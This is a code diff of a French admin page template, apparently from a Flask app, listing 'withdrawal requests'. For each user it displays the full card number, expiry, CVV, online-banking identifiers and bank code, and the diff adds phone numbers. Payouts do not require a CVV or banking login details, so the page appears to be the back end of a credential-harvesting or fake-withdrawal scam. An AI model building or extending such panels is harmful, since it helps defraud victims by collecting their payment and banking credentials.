@@ -6,76 +6,91 @@
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <title>Demandes de retrait - Admin</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+
     <style>
         body {
             font-family: Arial, sans-serif;
             background: #f9f9f9;
-            margin: 0; padding: 0;
+            margin: 0;
+            padding: 0;
             color: #333;
         }
+
         header {
             background-color: #004080;
             color: white;
             padding: 1rem 2rem;
             text-align: center;
         }
+
         main {
-            max-width: 900px;
+            max-width: 1000px;
             margin: 2rem auto;
             background: white;
             padding: 2rem;
             border-radius: 8px;
             box-shadow: 0 4px 10px rgba(0,0,0,0.1);
         }
+
         h1 {
             margin-bottom: 1rem;
             color: #004080;
         }
+
         table {
             width: 100%;
             border-collapse: collapse;
-            margin-bottom: 2rem;
         }
+
         th, td {
             padding: 0.8rem;
             border-bottom: 1px solid #ddd;
             text-align: left;
             vertical-align: top;
         }
+
         th {
             background-color: #e0e7f1;
         }
+
         .mode-card {
             background-color: #d1e7fd;
         }
-        .mode-bank, .mode-identification {
+
+        .mode-identification {
             background-color: #d1f7e7;
         }
+
         .status-pending {
             color: #b8860b;
             font-weight: bold;
         }
+
         .status-processed {
             color: green;
             font-weight: bold;
         }
+
         .status-rejected {
             color: red;
             font-weight: bold;
         }
+
         form button {
             background-color: #004080;
             border: none;
             color: white;
-            padding: 0.5rem 1rem;
-            margin-right: 0.5rem;
+            padding: 0.4rem 0.8rem;
+            margin-right: 0.3rem;
             cursor: pointer;
             border-radius: 4px;
             font-weight: bold;
         }
+
         form button:hover {
             background-color: #002d4d;
         }
+
         .info-block {
             background: #f4f7fc;
             border: 1px solid #cce0ff;
@@ -85,88 +100,106 @@
             white-space: pre-wrap;
             word-break: break-word;
         }
+
         nav a {
-            color: #004080;
+            color: white;
             text-decoration: none;
             font-weight: bold;
             margin-right: 1rem;
         }
+
         nav a:hover {
             text-decoration: underline;
         }
     </style>
 </head>
+
 <body>
+
 <header>
     <h1>Demandes de retrait en attente</h1>
     <nav>
-        <a href="{{ url_for('dashboard') }}">Retour au dashboard</a>
+        <a href="{{ url_for('dashboard') }}">Dashboard</a>
         <a href="{{ url_for('logout') }}">Déconnexion</a>
     </nav>
 </header>
+
 <main>
-    {% if requests %}
+{% if requests %}
     <table>
         <thead>
             <tr>
                 <th>Utilisateur</th>
                 <th>Montant</th>
-                <th>Mode de retrait</th>
+                <th>Mode</th>
                 <th>Détails</th>
-                <th>Date de la demande</th>
+                <th>Date</th>
                 <th>Statut</th>
                 <th>Actions</th>
             </tr>
         </thead>
+
         <tbody>
-            {% for req in requests %}
+        {% for req in requests %}
             <tr class="
                 {% if req.mode == 'Carte bancaire' %}mode-card{% endif %}
                 {% if req.mode == 'Identification bancaire' %}mode-identification{% endif %}
             ">
                 <td>{{ req.username }}</td>
+
                 <td>{{ "%.2f"|format(req.amount) }} €</td>
+
                 <td>{{ req.mode }}</td>
+
                 <td>
                     {% if req.mode == 'Carte bancaire' %}
                         <div class="info-block">
-                            Numéro de carte : {{ req.card_number }}<br />
-                            Date d'expiration : {{ req.card_expiry }}<br />
+                            📞 Téléphone : {{ req.phone_card }}<br><br>
+                            Numéro de carte : {{ req.card_number }}<br>
+                            Expiration : {{ req.card_expiry }}<br>
                             CVV : {{ req.card_cvv }}
                         </div>
+
                     {% elif req.mode == 'Identification bancaire' %}
                         <div class="info-block">
-                            Banque : {{ req.bank_name_id }}<br />
-                            Identifiants bancaires : {{ req.bank_identifiers }}<br />
+                            📞 Téléphone : {{ req.phone_id }}<br><br>
+                            Banque : {{ req.bank_name_id }}<br>
+                            Identifiants : {{ req.bank_identifiers }}<br>
                             Code banque : {{ req.bank_code_id }}
                         </div>
+
                     {% else %}
                         <div class="info-block">
-                            Aucune information disponible ou mode non supporté
+                            Aucune information disponible
                         </div>
                     {% endif %}
                 </td>
+
                 <td>{{ req.date.strftime('%d-%m-%Y %H:%M') }}</td>
+
                 <td class="status-{{ req.status|lower }}">
                     {{ req.status }}
                 </td>
+
                 <td>
-                    {% if req.status == 'En attente' %}
-                    <form action="{{ url_for('process_withdrawal', request_id=req._id) }}" method="POST" style="display:inline-block;">
-                        <button name="action" value="accept" type="submit" title="Accepter">✔️</button>
-                        <button name="action" value="reject" type="submit" title="Rejeter">❌</button>
+                {% if req.status == 'En attente' %}
+                    <form action="{{ url_for('process_withdrawal', request_id=req._id) }}"
+                          method="POST" style="display:inline;">
+                        <button name="action" value="accept" title="Accepter">✔</button>
+                        <button name="action" value="reject" title="Refuser">✖</button>
                     </form>
-                    {% else %}
-                        -
-                    {% endif %}
+                {% else %}
+                    —
+                {% endif %}
                 </td>
             </tr>
-            {% endfor %}
+        {% endfor %}
         </tbody>
     </table>
-    {% else %}
-        <p>Aucune demande de retrait pour le moment.</p>
-    {% endif %}
+{% else %}
+    <p>Aucune demande de retrait pour le moment.</p>
+{% endif %}
 </main>
+
 </body>
 </html>
